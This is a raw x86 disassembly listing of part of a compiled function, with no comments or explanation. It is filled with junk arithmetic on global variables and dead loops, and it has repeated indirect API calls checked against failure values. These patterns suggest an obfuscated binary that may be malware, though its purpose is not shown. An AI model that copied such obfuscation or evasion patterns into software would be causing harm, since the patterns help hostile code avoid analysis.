  423acd:	push   DWORD PTR [ebp+0x14]
  423ad0:	push   DWORD PTR [ebp+0x10]
  423ad3:	push   DWORD PTR [ebp+0xc]
  423ad6:	push   DWORD PTR [ebp+0x8]
  423ad9:	call   0x423466
  423ade:	pop    edi
  423adf:	pop    ebx
  423ae0:	pop    esi
  423ae1:	leave  
  423ae2:	ret    0x14
  423ae5:	push   ebp
  423ae6:	mov    ebp,esp
  423ae8:	and    esp,0xfffffff8
  423aeb:	mov    DWORD PTR ds:0x42a276,0x3141
  423af5:	sub    esp,0x3fc
  423afb:	mov    DWORD PTR ds:0x42a2fa,0x2654
  423b05:	push   ebx
  423b06:	push   esi
  423b07:	adc    DWORD PTR ds:0x42a2f2,0x42a2e6
  423b11:	push   edi
  423b12:	xor    edi,edi
  423b14:	or     DWORD PTR ds:0x42a256,0x42a2de
  423b1e:	push   edi
  423b1f:	call   DWORD PTR ds:0x42a3b6
  423b25:	add    DWORD PTR ds:0x42a2e2,0x667e
  423b2f:	mov    DWORD PTR [esp+0x10],eax
  423b33:	sbb    DWORD PTR ds:0x42a2f2,0x42a27e
  423b3d:	lea    eax,[esp+0x78]
  423b41:	push   eax
  423b42:	sbb    DWORD PTR ds:0x42a302,0x70a3
  423b4c:	push   0x429542
  423b51:	or     DWORD PTR ds:0x42a2be,0x4f4
  423b5b:	call   DWORD PTR ds:0x42a3c6
  423b61:	mov    DWORD PTR ds:0x42a2c6,0x224d
  423b6b:	cmp    eax,0xffffffff
  423b6e:	mov    DWORD PTR ds:0x42a26a,0x664
  423b78:	je     0x423b8f
  423b7e:	xor    eax,eax
  423b80:	mov    DWORD PTR ds:0x42a2ee,0x6e63
  423b8a:	jmp    0x424de1
  423b8f:	mov    DWORD PTR ds:0x42a2ee,0x3a46
  423b99:	mov    esi,DWORD PTR ds:0x42a3fe
  423b9f:	push   0xf
  423ba1:	lea    eax,[esp+0x44]
  423ba5:	xor    DWORD PTR ds:0x42a26a,0x150a
  423baf:	push   eax
  423bb0:	push   0x429556
  423bb5:	push   0x42956a
  423bba:	xor    DWORD PTR ds:0x42a2de,0x3930
  423bc4:	push   0x42958a
  423bc9:	call   esi
  423bcb:	imul   eax,eax,0x300000
  423bd1:	cmp    eax,0x1b00000
  423bd6:	jne    0x423b7e
  423bdc:	sub    DWORD PTR ds:0x42a26a,0x42a2e2
  423be6:	lea    eax,[esp+0x1b8]
  423bed:	adc    DWORD PTR ds:0x42a28e,0x3c8a
  423bf7:	push   eax
  423bf8:	push   0x4295c6
  423bfd:	call   DWORD PTR ds:0x42a3e6
  423c03:	mov    DWORD PTR ds:0x42a2ca,0x78b4
  423c0d:	cmp    eax,0xffffffff
  423c10:	mov    DWORD PTR ds:0x42a296,0x5d2d
  423c1a:	jne    0x423b7e
  423c20:	and    DWORD PTR ds:0x42a25e,0x42a266
  423c2a:	push   DWORD PTR [esp+0x10]
  423c2e:	push   edi
  423c2f:	call   DWORD PTR ds:0x42a3ba
  423c35:	add    DWORD PTR ds:0x42a256,0x6e9d
  423c3f:	mov    DWORD PTR [esp+0x30],edi
  423c43:	or     ecx,ecx
  423c45:	mov    DWORD PTR [esp+0x20],0xf89c85a5
  423c4d:	mov    DWORD PTR ds:0x42a2ba,0x17
  423c57:	cmp    DWORD PTR ds:0x42a2ba,0x0
  423c5e:	je     0x423cc1
  423c64:	cmp    DWORD PTR ds:0x42a2ba,0x4
  423c6b:	jl     0x423cc1
  423c71:	jmp    0x423c93
  423c76:	push   0x1
  423c78:	push   0x4b19
  423c7d:	push   DWORD PTR [ebp-0x1c]
  423c80:	push   0x1751
  423c85:	push   0x1baf
  423c8a:	push   DWORD PTR [ebp-0x24]
  423c8d:	call   DWORD PTR ds:0x42a3c2
  423c93:	cmp    DWORD PTR ds:0x42a2ba,0x5
  423c9a:	jne    0x423cad
  423ca0:	mov    ecx,DWORD PTR ds:0x42a2ba
  423ca6:	dec    ecx
  423ca7:	mov    DWORD PTR ds:0x42a2ba,ecx
  423cad:	xor    ecx,ecx
  423caf:	xor    ecx,DWORD PTR ds:0x42a2ba
  423cb5:	dec    ecx
  423cb6:	mov    DWORD PTR ds:0x42a2ba,ecx
  423cbc:	jmp    0x423c57
  423cc1:	mov    DWORD PTR [esp+0xc],0xf89c85ba
  423cc9:	adc    DWORD PTR ds:0x42a292,edx
  423ccf:	lea    eax,[esp+0x3c]
  423cd3:	mov    edi,DWORD PTR ds:0x42a2ba
  423cd9:	or     DWORD PTR ds:0x42a26e,edi
  423cdf:	mov    DWORD PTR [esp+0x30],eax
  423ce3:	lea    eax,[esp+0x38]
  423ce7:	and    edi,ecx
  423ce9:	mov    DWORD PTR [esp+0x10],eax
  423ced:	add    edi,ecx
  423cef:	mov    eax,ds:0x42941e
  423cf4:	and    DWORD PTR ds:0x42a25a,0x0
  423cfe:	jmp    0x423d10
  423d03:	mov    edi,DWORD PTR ds:0x42a25a
  423d09:	inc    edi
  423d0a:	mov    DWORD PTR ds:0x42a25a,edi
  423d10:	cmp    DWORD PTR ds:0x42a25a,0x16
  423d17:	jae    0x423d44
  423d1d:	cmp    DWORD PTR ds:0x42a25a,0x17
  423d24:	jbe    0x423d44
  423d2a:	jmp    0x423d3f
  423d2f:	push   0x42a256
  423d34:	push   0x42919f
  423d39:	call   DWORD PTR ds:0x42a3ca
  423d3f:	jmp    0x423d03
  423d44:	mov    eax,DWORD PTR [eax+0x1c8]
  423d4a:	sbb    ebx,edi
  423d4c:	mov    eax,DWORD PTR [eax]
  423d4e:	add    DWORD PTR ds:0x42a26a,0x5b95
  423d58:	mov    ecx,DWORD PTR [esp+0x10]
  423d5c:	mov    edi,0x75108aa
  423d61:	mov    ebx,DWORD PTR ds:0x42a2e6
  423d67:	sbb    DWORD PTR ds:0x42a25e,ebx
  423d6d:	xor    eax,edi
  423d6f:	adc    DWORD PTR ds:0x42a2fe,0x37f0
  423d79:	mov    ebx,0x3272f1
  423d7e:	add    DWORD PTR ds:0x42a2ae,0x42a2b2
  423d88:	add    eax,ebx
  423d8a:	not    DWORD PTR ds:0x42a2ae
  423d90:	mov    DWORD PTR [ecx],eax
  423d92:	mov    DWORD PTR ds:0x42a2d6,0x5252
  423d9c:	mov    eax,ds:0x42a11a
  423da1:	cmp    eax,0x445cecf9
  423da6:	mov    DWORD PTR ds:0x42a2c6,0x4b3f
  423db0:	jne    0x423e9e
  423db6:	mov    eax,DWORD PTR [esp+0x20]
  423dba:	and    DWORD PTR ds:0x42a2b6,0x0
  423dc4:	jmp    0x423dd6
  423dc9:	mov    ecx,DWORD PTR ds:0x42a2b6
  423dcf:	inc    ecx
  423dd0:	mov    DWORD PTR ds:0x42a2b6,ecx
  423dd6:	cmp    DWORD PTR ds:0x42a2b6,0x14
  423ddd:	jae    0x423e26
  423de3:	cmp    DWORD PTR ds:0x42a2b6,0x8
  423dea:	ja     0x423e26
  423df0:	jmp    0x423e05
  423df5:	push   0x84fb
  423dfa:	push   0x42a28e
  423dff:	call   DWORD PTR ds:0x42a3ce
  423e05:	cmp    DWORD PTR ds:0x42a2b6,0x7
  423e0c:	jne    0x423e21
  423e12:	xor    ecx,ecx
  423e14:	add    ecx,DWORD PTR ds:0x42a2b6
  423e1a:	inc    ecx
  423e1b:	mov    DWORD PTR ds:0x42a2b6,ecx
  423e21:	jmp    0x423dc9
  423e26:	mov    ecx,DWORD PTR ds:0x42941e
  423e2c:	adc    DWORD PTR ds:0x42a2be,0x42a2b2
  423e36:	mov    ecx,DWORD PTR [ecx+0x198]
  423e3c:	adc    DWORD PTR ds:0x42a2ae,0x42a29a
  423e46:	xor    eax,edi
  423e48:	sub    DWORD PTR ds:0x42a27a,0x42a2a2
  423e52:	add    eax,ebx
  423e54:	add    DWORD PTR ds:0x42a26a,0x42a266
  423e5e:	mov    DWORD PTR [ecx],eax
  423e60:	mov    eax,DWORD PTR [esp+0x20]
  423e64:	xor    eax,edi
  423e66:	not    DWORD PTR ds:0x42a2be
  423e6c:	add    eax,ebx
  423e6e:	sbb    DWORD PTR ds:0x42a2f6,0x42a2de
  423e78:	mov    ds:0x42a11a,eax
  423e7d:	mov    eax,DWORD PTR [esp+0x20]
  423e81:	sbb    DWORD PTR ds:0x42a286,0x42a26a
  423e8b:	xor    eax,edi
  423e8d:	sub    DWORD PTR ds:0x42a272,0x5dcc
  423e97:	add    eax,ebx
  423e99:	mov    ds:0x429516,eax
  423e9e:	and    DWORD PTR ds:0x42a2ce,0x0
  423ea8:	xor    eax,eax
  423eaa:	xor    eax,DWORD PTR ds:0x42a2ce
  423eb0:	inc    eax
  423eb1:	mov    ds:0x42a2ce,eax
  423eb6:	cmp    DWORD PTR ds:0x42a2ce,0x10
  423ebd:	jg     0x423f03
  423ec3:	jmp    0x423ede
  423ec8:	push   DWORD PTR [ebp-0x18]
  423ecb:	push   0x42a2b6
  423ed0:	push   DWORD PTR [ebp-0x10]
  423ed3:	push   0x4828
  423ed8:	call   DWORD PTR ds:0x42a3d2
  423ede:	cmp    DWORD PTR ds:0x42a2ce,0xf
  423ee5:	jne    0x423ef6
  423eeb:	mov    eax,ds:0x42a2ce
  423ef0:	inc    eax
  423ef1:	mov    ds:0x42a2ce,eax
  423ef6:	cmp    DWORD PTR ds:0x42a2ce,0x1a
  423efd:	jb     0x423ea8
  423f03:	mov    eax,ds:0x42941e
  423f08:	mov    eax,DWORD PTR [eax+0x18c]
  423f0e:	add    DWORD PTR ds:0x42a28e,0x42a292
  423f18:	mov    eax,DWORD PTR [eax]
  423f1a:	neg    DWORD PTR ds:0x42a302
  423f20:	mov    DWORD PTR [esp+0x60],eax
  423f24:	xor    eax,eax
  423f26:	xor    eax,DWORD PTR ds:0x42a27a
  423f2c:	xor    eax,DWORD PTR ds:0x42a266
  423f32:	mov    ds:0x42a27a,eax
  423f37:	mov    eax,0xf89c85b9
  423f3c:	mov    DWORD PTR [esp+0x18],eax
  423f40:	mov    DWORD PTR [esp+0x18],eax
  423f44:	and    DWORD PTR ds:0x42a2ae,0xe84
  423f4e:	mov    DWORD PTR [esp+0x18],eax
  423f52:	sub    DWORD PTR ds:0x42a2ce,0x42a2d6
  423f5c:	mov    DWORD PTR [esp+0x18],0xf89c85a5
  423f64:	adc    DWORD PTR ds:0x42a2f2,0x42a29a
  423f6e:	mov    DWORD PTR [esp+0x10],eax
  423f72:	xor    eax,0x48fc
  423f77:	mov    DWORD PTR [esp+0x10],0xf89c85bd
  423f7f:	mov    eax,DWORD PTR [esp+0x20]
  423f83:	add    DWORD PTR ds:0x42a2fa,0x42a25e
  423f8d:	xor    eax,edi
  423f8f:	sub    DWORD PTR ds:0x42a29a,0x2bd1
  423f99:	add    eax,ebx
  423f9b:	mov    DWORD PTR ds:0x42a276,0x6294
  423fa5:	jmp    0x4241e9
  423faa:	lea    eax,[esp+0x78]
  423fae:	push   eax
  423faf:	dec    DWORD PTR ds:0x42a292
  423fb5:	push   0x4295b2
  423fba:	adc    DWORD PTR ds:0x42a2fa,0x42a2de
  423fc4:	call   DWORD PTR ds:0x42a3c6
  423fca:	mov    DWORD PTR ds:0x42a262,0x2f3f
  423fd4:	cmp    eax,0xffffffff
  423fd7:	jne    0x423b7e
  423fdd:	add    DWORD PTR ds:0x42a2da,0x42a2d2
  423fe7:	push   0xf
  423fe9:	and    DWORD PTR ds:0x42a2ce,0x42a27e
  423ff3:	lea    eax,[esp+0x44]
  423ff7:	push   eax
  423ff8:	push   0x429606
  423ffd:	push   0x42961a
  424002:	push   0x42963a
  424007:	call   esi
  424009:	or     DWORD PTR ds:0x42a2fa,0x3e60
  424013:	imul   eax,eax,0x300000
  424019:	mov    DWORD PTR ds:0x42a2ae,0x6f02
  424023:	cmp    eax,0x1b00000
  424028:	mov    DWORD PTR ds:0x42a256,0x6c6e
  424032:	jne    0x423b7e
  424038:	or     DWORD PTR ds:0x42a2ea,0x2c5c
  424042:	lea    eax,[esp+0x1b8]
  424049:	push   eax
  42404a:	push   0x429676
  42404f:	add    DWORD PTR ds:0x42a2de,0x42a26e
  424059:	call   DWORD PTR ds:0x42a3e6
  42405f:	mov    DWORD PTR ds:0x42a27e,0xb7
  424069:	cmp    eax,0xffffffff
  42406c:	mov    DWORD PTR ds:0x42a29a,0x2154
  424076:	jne    0x423b7e
  42407c:	xor    DWORD PTR ds:0x42a2ae,0x154c
  424086:	mov    eax,DWORD PTR [esp+0xc]
  42408a:	mov    DWORD PTR ds:0x42a26e,0x11
  424094:	cmp    DWORD PTR ds:0x42a26e,0x0
  42409b:	je     0x4240e6
  4240a1:	cmp    DWORD PTR ds:0x42a26e,0x12
  4240a8:	jge    0x4240e6
  4240ae:	jmp    0x4240d4
  4240b3:	push   DWORD PTR [ebp-0x28]
  4240b6:	push   DWORD PTR [ebp-0x24]
  4240b9:	push   DWORD PTR [ebp-0x24]
  4240bc:	push   0x7e73
  4240c1:	push   DWORD PTR [ebp-0x18]
  4240c4:	push   0x85b3
  4240c9:	push   0x429247
  4240ce:	call   DWORD PTR ds:0x42a3d6
  4240d4:	mov    ecx,DWORD PTR ds:0x42a26e
  4240da:	dec    ecx
  4240db:	mov    DWORD PTR ds:0x42a26e,ecx
  4240e1:	jmp    0x424094
  4240e6:	mov    ecx,DWORD PTR [esp+0x10]
  4240ea:	adc    DWORD PTR ds:0x42a2ae,0x42a2d2
  4240f4:	xor    eax,edi
  4240f6:	lea    eax,[eax+ecx*1+0x3272f1]
  4240fd:	push   eax
  4240fe:	and    DWORD PTR ds:0x42a2ea,0x0
  424108:	mov    eax,ds:0x42a2ea
  42410d:	inc    eax
  42410e:	mov    ds:0x42a2ea,eax
  424113:	cmp    DWORD PTR ds:0x42a2ea,0x26
  42411a:	jbe    0x424138
  424120:	jmp    0x42412b
  424125:	call   DWORD PTR ds:0x42a3da
  42412b:	cmp    DWORD PTR ds:0x42a2ea,0x1a
  424132:	jb     0x424108
  424138:	mov    eax,DWORD PTR [esp+0x1c]
  42413c:	sbb    DWORD PTR ds:0x42a2aa,0x42a2be
  424146:	xor    eax,edi
  424148:	lea    eax,[ebp+eax*1+0x3272f9]
  42414f:	push   eax
  424150:	mov    eax,ds:0x42941e
  424155:	push   DWORD PTR [eax+0x1bc]
  42415b:	sub    DWORD PTR ds:0x42a2ea,0x42a286
  424165:	call   0x424dea
  42416a:	mov    eax,DWORD PTR [esp+0xc]
  42416e:	mov    ecx,DWORD PTR [esp+0x10]
  424172:	and    DWORD PTR ds:0x42a2aa,0x0
  42417c:	mov    edx,DWORD PTR ds:0x42a2aa
  424182:	inc    edx
  424183:	mov    DWORD PTR ds:0x42a2aa,edx
  424189:	cmp    DWORD PTR ds:0x42a2aa,0x9
  424190:	jg     0x4241da
  424196:	jmp    0x4241b1
  42419b:	push   DWORD PTR [ebp-0x10]
  42419e:	push   0x1529
  4241a3:	push   DWORD PTR [ebp-0x28]
  4241a6:	push   0x155a
  4241ab:	call   DWORD PTR ds:0x42a3de
  4241b1:	cmp    DWORD PTR ds:0x42a2aa,0x8
  4241b8:	jne    0x4241cd
  4241be:	xor    edx,edx
  4241c0:	or     edx,DWORD PTR ds:0x42a2aa
  4241c6:	inc    edx
  4241c7:	mov    DWORD PTR ds:0x42a2aa,edx
  4241cd:	cmp    DWORD PTR ds:0x42a2aa,0x1e
  4241d4:	jb     0x42417c
  4241da:	xor    eax,edi
  4241dc:	adc    DWORD PTR ds:0x42a256,ebx
  4241e2:	lea    eax,[ecx+eax*1+0x3272f1]
  4241e9:	movzx  ecx,WORD PTR ds:0x42a2a6
  4241f0:	xor    DWORD PTR ds:0x42a29e,ecx
  4241f6:	mov    ecx,DWORD PTR [esp+0xc]
  4241fa:	mov    edx,DWORD PTR [esp+0xc]
  4241fe:	adc    DWORD PTR ds:0x42a2b6,0x42a2ee
  424208:	xor    edx,edi
  42420a:	xor    ecx,edi
  42420c:	add    ecx,edx
  42420e:	mov    edx,DWORD PTR [esp+0xc]
  424212:	xor    edx,edi
  424214:	lea    ecx,[ecx+edx*1+0x9758d3]
  42421b:	mov    DWORD PTR ds:0x42a2ea,0x175a
  424225:	mov    DWORD PTR [esp+0x10],eax
  424229:	mov    DWORD PTR ds:0x42a28e,0x2b18
  424233:	cmp    eax,ecx
  424235:	jbe    0x423faa
  42423b:	or     ecx,DWORD PTR ds:0x42a286
  424241:	mov    eax,DWORD PTR [ebp+0xc]
  424244:	mov    ds:0x4292a2,eax
  424249:	mov    eax,DWORD PTR [ebp+0x10]
  42424c:	and    DWORD PTR ds:0x42a2c2,0x0
  424256:	jmp    0x42426a
  42425b:	xor    ecx,ecx
  42425d:	xor    ecx,DWORD PTR ds:0x42a2c2
  424263:	inc    ecx
  424264:	mov    DWORD PTR ds:0x42a2c2,ecx
  42426a:	cmp    DWORD PTR ds:0x42a2c2,0x1b
  424271:	jae    0x424294
  424277:	cmp    DWORD PTR ds:0x42a2c2,0x29
  42427e:	jle    0x424294
  424284:	jmp    0x42428f
  424289:	call   DWORD PTR ds:0x42a3e2
  42428f:	jmp    0x42425b
  424294:	mov    ds:0x4294fe,eax
  424299:	xor    ecx,eax
  42429b:	mov    eax,ds:0x4292a2
  4242a0:	and    ecx,0x3395
  4242a6:	mov    ecx,DWORD PTR [esp+0x30]
  4242aa:	add    DWORD PTR ds:0x42a2c2,0x886
  4242b4:	sub    eax,ebx
  4242b6:	adc    DWORD PTR ds:0x42a2c2,0x4089
  4242c0:	xor    eax,edi
  4242c2:	sub    DWORD PTR ds:0x42a2b6,0x2768
  4242cc:	mov    DWORD PTR [ecx],eax
  4242ce:	and    DWORD PTR ds:0x42a2aa,0x51d9
  4242d8:	lea    eax,[esp+0x2c]
  4242dc:	mov    DWORD PTR [esp+0x6c],eax
  4242e0:	lea    eax,[ebp+0x4]
  4242e3:	mov    DWORD PTR [esp+0x2c],eax
  4242e7:	xor    DWORD PTR ds:0x42a2da,0x6aa
  4242f1:	lea    eax,[esp+0x78]
  4242f5:	sub    DWORD PTR ds:0x42a266,0x42a2ba
  4242ff:	push   eax
  424300:	push   0x429662
  424305:	sub    DWORD PTR ds:0x42a25e,0x6538
  42430f:	call   DWORD PTR ds:0x42a3c6
  424315:	mov    DWORD PTR ds:0x42a2aa,0x7d87
  42431f:	cmp    eax,0xffffffff
  424322:	jne    0x423b7e
  424328:	push   0xf
  42432a:	lea    eax,[esp+0x44]
  42432e:	push   eax
  42432f:	and    DWORD PTR ds:0x42a302,0x42a2e2
  424339:	push   0x4296b6
  42433e:	sub    DWORD PTR ds:0x42a2d2,0x1a40
  424348:	push   0x4296ca
  42434d:	adc    DWORD PTR ds:0x42a302,0xcfc
  424357:	push   0x4296ea
  42435c:	add    DWORD PTR ds:0x42a292,0x42a286
  424366:	call   esi
  424368:	xor    DWORD PTR ds:0x42a2aa,0x42a302
  424372:	imul   eax,eax,0x300000
  424378:	cmp    eax,0x1b00000
  42437d:	mov    DWORD PTR ds:0x42a2d6,0x3d32
  424387:	jne    0x423b7e
  42438d:	lea    eax,[esp+0x1b8]
  424394:	adc    DWORD PTR ds:0x42a29a,0x42a2c6
  42439e:	push   eax
  42439f:	and    DWORD PTR ds:0x42a2ea,0x7bce
  4243a9:	push   0x429726
  4243ae:	xor    DWORD PTR ds:0x42a2d2,0x75c
  4243b8:	call   DWORD PTR ds:0x42a3e6
  4243be:	cmp    eax,0xffffffff
  4243c1:	mov    DWORD PTR ds:0x42a2d6,0x39fb
  4243cb:	jne    0x423b7e
  4243d1:	sbb    DWORD PTR ds:0x42a2ea,0x7658
  4243db:	lea    eax,[esp+0x78]
  4243df:	push   eax
  4243e0:	push   0x429712
  4243e5:	call   DWORD PTR ds:0x42a3c6
  4243eb:	cmp    eax,0xffffffff
  4243ee:	mov    DWORD PTR ds:0x42a27a,0x74cc
  4243f8:	jne    0x423b7e
  4243fe:	adc    DWORD PTR ds:0x42a2be,0x42a2e2
  424408:	push   0xf
  42440a:	and    DWORD PTR ds:0x42a272,0x42a2d6
  424414:	lea    eax,[esp+0x44]
  424418:	xor    DWORD PTR ds:0x42a2da,0x20f3
  424422:	push   eax
  424423:	sub    DWORD PTR ds:0x42a2f2,0x57ed
  42442d:	push   0x429766
  424432:	push   0x42977a
  424437:	push   0x42979a
  42443c:	sbb    DWORD PTR ds:0x42a272,0x42a302
  424446:	call   esi
  424448:	imul   eax,eax,0x300000
  42444e:	cmp    eax,0x1b00000
  424453:	mov    DWORD PTR ds:0x42a2ea,0x7ab0
  42445d:	jne    0x423b7e
  424463:	and    DWORD PTR ds:0x42a2e6,0x42a29a
  42446d:	lea    eax,[esp+0x1b8]
  424474:	neg    DWORD PTR ds:0x42a26e
  42447a:	push   eax
  42447b:	push   0x4297d6
  424480:	xor    DWORD PTR ds:0x42a28e,0x42a2c2
  42448a:	call   DWORD PTR ds:0x42a3e6
  424490:	mov    DWORD PTR ds:0x42a292,0x73e5
  42449a:	cmp    eax,0xffffffff
  42449d:	jne    0x423b7e
  4244a3:	lea    eax,[esp+0x78]
  4244a7:	xor    DWORD PTR ds:0x42a2ea,0x42a256
  4244b1:	push   eax
  4244b2:	and    DWORD PTR ds:0x42a28e,0x42a256
  4244bc:	push   0x4297c2
  4244c1:	sub    DWORD PTR ds:0x42a26e,0xb4e
  4244cb:	call   DWORD PTR ds:0x42a3c6
  4244d1:	mov    DWORD PTR ds:0x42a292,0x325f
  4244db:	cmp    eax,0xffffffff
  4244de:	mov    DWORD PTR ds:0x42a2d2,0x412a
  4244e8:	jne    0x423b7e
  4244ee:	adc    DWORD PTR ds:0x42a28a,0x42a27a
  4244f8:	push   0xf
  4244fa:	lea    eax,[esp+0x44]
  4244fe:	push   eax
  4244ff:	adc    DWORD PTR ds:0x42a28a,0x1e7a
  424509:	push   0x429816
  42450e:	sub    DWORD PTR ds:0x42a2aa,0xfe
  424518:	push   0x42982a
  42451d:	sub    DWORD PTR ds:0x42a27e,0x1b5
  424527:	push   0x42984a
  42452c:	adc    DWORD PTR ds:0x42a28e,0x2d72
  424536:	call   esi
  424538:	imul   eax,eax,0x300000
  42453e:	cmp    eax,0x1b00000
  424543:	mov    DWORD PTR ds:0x42a28e,0x482a
  42454d:	jne    0x423b7e
  424553:	sub    DWORD PTR ds:0x42a25a,0x42a2ba
  42455d:	lea    eax,[esp+0x1b8]
  424564:	push   eax
  424565:	adc    DWORD PTR ds:0x42a28e,0x42a2da
  42456f:	push   0x429886
  424574:	xor    DWORD PTR ds:0x42a26e,0x42a29a
  42457e:	call   DWORD PTR ds:0x42a3e6
  424584:	mov    DWORD PTR ds:0x42a2ca,0x1025
  42458e:	cmp    eax,0xffffffff
  424591:	jne    0x423b7e
  424597:	xor    DWORD PTR ds:0x42a2c2,0x449b
  4245a1:	lea    eax,[esp+0x78]
  4245a5:	push   eax
  4245a6:	push   0x429872
  4245ab:	and    DWORD PTR ds:0x42a27a,0x42a2fa
  4245b5:	call   DWORD PTR ds:0x42a3c6
  4245bb:	mov    DWORD PTR ds:0x42a2fa,0x2004
  4245c5:	cmp    eax,0xffffffff
  4245c8:	mov    DWORD PTR ds:0x42a296,0x62c6
  4245d2:	jne    0x423b7e
  4245d8:	and    DWORD PTR ds:0x42a2de,0x5eb4
  4245e2:	push   0xf
  4245e4:	adc    DWORD PTR ds:0x42a28a,0x4918
  4245ee:	lea    eax,[esp+0x44]
  4245f2:	or     DWORD PTR ds:0x42a2a6,0x42a25e
  4245fc:	push   eax
  4245fd:	sbb    DWORD PTR ds:0x42a2a2,0x42a262
  424607:	push   0x4298c6
  42460c:	xor    DWORD PTR ds:0x42a2d2,0x1d8b
  424616:	push   0x4298da
  42461b:	and    DWORD PTR ds:0x42a2b6,0x42a302
  424625:	push   0x4298fa
  42462a:	not    DWORD PTR ds:0x42a2d2
  424630:	call   esi
  424632:	imul   eax,eax,0x300000
  424638:	cmp    eax,0x1b00000
  42463d:	mov    DWORD PTR ds:0x42a292,0xbee
  424647:	jne    0x423b7e
  42464d:	xor    DWORD PTR ds:0x42a266,0x42a2c6
  424657:	lea    eax,[esp+0x1b8]
  42465e:	push   eax
  42465f:	or     DWORD PTR ds:0x42a2be,0x2cef
  424669:	push   0x429936
  42466e:	call   DWORD PTR ds:0x42a3e6
  424674:	cmp    eax,0xffffffff
  424677:	mov    DWORD PTR ds:0x42a2b6,0x6b51
  424681:	jne    0x423b7e
  424687:	sub    DWORD PTR ds:0x42a276,0x363f
  424691:	lea    eax,[esp+0x78]
  424695:	add    DWORD PTR ds:0x42a29e,0x42a302
  42469f:	push   eax
  4246a0:	push   0x429922
  4246a5:	adc    DWORD PTR ds:0x42a27a,0x42a2c6
  4246af:	call   DWORD PTR ds:0x42a3c6
  4246b5:	cmp    eax,0xffffffff
  4246b8:	jne    0x423b7e
  4246be:	or     DWORD PTR ds:0x42a292,0x4d8b
  4246c8:	push   0xf
  4246ca:	or     DWORD PTR ds:0x42a2c6,0x42a2d2
  4246d4:	lea    eax,[esp+0x44]
  4246d8:	push   eax
  4246d9:	adc    DWORD PTR ds:0x42a2a6,0x7f91
  4246e3:	push   0x429976
  4246e8:	and    DWORD PTR ds:0x42a28e,0x42a27e
  4246f2:	push   0x42998a
  4246f7:	push   0x4299aa
  4246fc:	call   esi
  4246fe:	or     DWORD PTR ds:0x42a2d6,0x5541
  424708:	imul   eax,eax,0x300000
  42470e:	mov    DWORD PTR ds:0x42a292,0x284d
  424718:	cmp    eax,0x1b00000
  42471d:	mov    DWORD PTR ds:0x42a302,0x32eb
  424727:	jne    0x423b7e
  42472d:	adc    DWORD PTR ds:0x42a2ee,0x651e
  424737:	lea    eax,[esp+0x1b8]
  42473e:	push   eax
  42473f:	and    DWORD PTR ds:0x42a286,0x42a2f2
  424749:	push   0x4299e6
  42474e:	sub    DWORD PTR ds:0x42a2ee,0x3d63
  424758:	call   DWORD PTR ds:0x42a3e6
  42475e:	mov    DWORD PTR ds:0x42a2a2,0x1646
  424768:	cmp    eax,0xffffffff
  42476b:	jne    0x423b7e
  424771:	adc    DWORD PTR ds:0x42a286,0x29d1
  42477b:	lea    eax,[esp+0x78]
  42477f:	push   eax
  424780:	sbb    DWORD PTR ds:0x42a25a,0x42a26e
  42478a:	push   0x4299d2
  42478f:	adc    DWORD PTR ds:0x42a28a,0x42a2ae
  424799:	call   DWORD PTR ds:0x42a3c6
  42479f:	cmp    eax,0xffffffff
  4247a2:	jne    0x423b7e
  4247a8:	push   0xf
  4247aa:	mov    DWORD PTR ds:0x42a2da,0x5dc8
  4247b4:	lea    eax,[esp+0x44]
  4247b8:	add    DWORD PTR ds:0x42a2a6,0x42a2b6
  4247c2:	push   eax
  4247c3:	not    DWORD PTR ds:0x42a25e
  4247c9:	push   0x429a26
  4247ce:	push   0x429a3a
  4247d3:	or     DWORD PTR ds:0x42a26a,0x42a25e
  4247dd:	push   0x429a5a
  4247e2:	call   esi
  4247e4:	imul   eax,eax,0x300000
  4247ea:	cmp    eax,0x1b00000
  4247ef:	jne    0x423b7e
  4247f5:	lea    eax,[esp+0x1b8]
  4247fc:	push   eax
  4247fd:	push   0x429a96
  424802:	xor    DWORD PTR ds:0x42a286,0x22c0
  42480c:	call   DWORD PTR ds:0x42a3e6
  424812:	cmp    eax,0xffffffff
  424815:	jne    0x423b7e
  42481b:	xor    DWORD PTR ds:0x42a2d6,0x42a2f2
  424825:	lea    eax,[esp+0x78]
  424829:	and    DWORD PTR ds:0x42a272,0x42a2da
  424833:	push   eax
  424834:	push   0x429a82
  424839:	dec    DWORD PTR ds:0x42a2ae
  42483f:	call   DWORD PTR ds:0x42a3c6
  424845:	mov    DWORD PTR ds:0x42a296,0x5803
  42484f:	cmp    eax,0xffffffff
  424852:	mov    DWORD PTR ds:0x42a2ee,0x7cea
  42485c:	jne    0x423b7e
  424862:	xor    DWORD PTR ds:0x42a2c6,0x69dc
  42486c:	push   0xf
  42486e:	add    DWORD PTR ds:0x42a302,0x59e7
  424878:	lea    eax,[esp+0x44]
  42487c:	push   eax
  42487d:	push   0x429ad6
  424882:	and    DWORD PTR ds:0x42a2fa,0x200e
  42488c:	push   0x429aea
  424891:	push   0x429b0a
  424896:	call   esi
  424898:	imul   eax,eax,0x300000
  42489e:	cmp    eax,0x1b00000
  4248a3:	mov    DWORD PTR ds:0x42a29e,0x5c25
  4248ad:	jne    0x423b7e
  4248b3:	sbb    DWORD PTR ds:0x42a2ce,0x42a2d6
  4248bd:	lea    eax,[esp+0x1b8]
  4248c4:	xor    DWORD PTR ds:0x42a2a2,0x42a2aa
  4248ce:	push   eax
  4248cf:	push   0x429b46
  4248d4:	or     DWORD PTR ds:0x42a266,0x3d87
  4248de:	call   DWORD PTR ds:0x42a3e6
  4248e4:	mov    DWORD PTR ds:0x42a2ca,0x3132
  4248ee:	cmp    eax,0xffffffff
  4248f1:	jne    0x423b7e
  4248f7:	lea    eax,[esp+0x78]
  4248fb:	push   eax
  4248fc:	push   0x429b32
  424901:	call   DWORD PTR ds:0x42a3c6
  424907:	cmp    eax,0xffffffff
  42490a:	jne    0x423b7e
  424910:	push   0xf
  424912:	lea    eax,[esp+0x44]
  424916:	push   eax
  424917:	push   0x429b86
  42491c:	push   0x429b9a
  424921:	push   0x429bba
  424926:	call   esi
  424928:	imul   eax,eax,0x300000
  42492e:	cmp    eax,0x1b00000
  424933:	jne    0x423b7e
  424939:	lea    eax,[esp+0x1b8]
  424940:	push   eax
  424941:	push   0x429bf6
  424946:	call   DWORD PTR ds:0x42a3e6
  42494c:	cmp    eax,0xffffffff
  42494f:	jne    0x423b7e
  424955:	lea    eax,[esp+0x78]
  424959:	push   eax
  42495a:	push   0x429be2
  42495f:	call   DWORD PTR ds:0x42a3c6
  424965:	cmp    eax,0xffffffff
  424968:	jne    0x423b7e
  42496e:	push   0xf
  424970:	lea    eax,[esp+0x44]
  424974:	push   eax
  424975:	push   0x429c36
